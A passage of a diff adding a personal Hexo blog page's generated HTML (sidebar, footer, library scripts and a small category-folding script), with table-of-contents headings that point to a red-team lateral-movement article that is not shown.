class="nav-text">横向执行协议隐蔽性分级</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E5%9C%BA%E5%BC%82%E5%B8%B8%E5%A4%84%E7%BD%AE%E8%A7%84%E8%8C%83"><span class="nav-number">6.</span> <span class="nav-text">赛场异常处置规范</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="s0m1ng"
+      src="/images/profile_photo.jpg">
+  <p class="site-author-name" itemprop="name">s0m1ng</p>
+  <div class="site-description" itemprop="description">逆向学习中~</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">75</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=1327470638&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;1327470638&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">s0m1ng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+function initCategoryFold() {
+  // 找到所有包含了子分类的 <ul>
+  var childLists = document.querySelectorAll('.category-list-child');
+  
+  childLists.forEach(function(child) {
+    // 防抖：防止 PJAX 刷新导致重复注入图标
+    if (child.parentElement.getAttribute('data-folded') === 'true') return;
+    child.parentElement.setAttribute('data-folded', 'true');
+    
+    // 1. 默认把所有子分类强行隐藏
+    child.style.display = 'none'; 
+    
+    // 2. 创建一个带有黑客风的 [+]/[-] 开关
+    var toggleSpan = document.createElement('span');
+    toggleSpan.innerHTML = ' ➕ ';
+    toggleSpan.style.cursor = 'pointer';
+    toggleSpan.style.fontSize = '12px';
+    toggleSpan.style.marginRight = '5px';
+    
+    // 3. 把开关插到父分类名字的前面
+    var parentLi = child.parentElement;
+    parentLi.insertBefore(toggleSpan, parentLi.firstChild);
+    
+    // 4. 给开关绑定点击事件 (Hook)
+    toggleSpan.addEventListener('click', function(e) {
+      e.stopPropagation(); // 阻止事件冒泡，防止误点分类链接
+      if (child.style.display === 'none') {
+        child.style.display = 'block';
+        toggleSpan.innerHTML = ' ➖ ';
+      } else {
+        child.style.display = 'none';
+        toggleSpan.innerHTML = ' ➕ ';
+      }
+    });
+  });
+}
+
+// 首次加载页面时执行
+document.addEventListener("DOMContentLoaded", initCategoryFold);
+// 如果你的 NexT 开启了 PJAX (无刷新跳转)，保证跳转后依然生效
+document.addEventListener("pjax:success", initCategoryFold);
+</script>
+</body>
+</html>
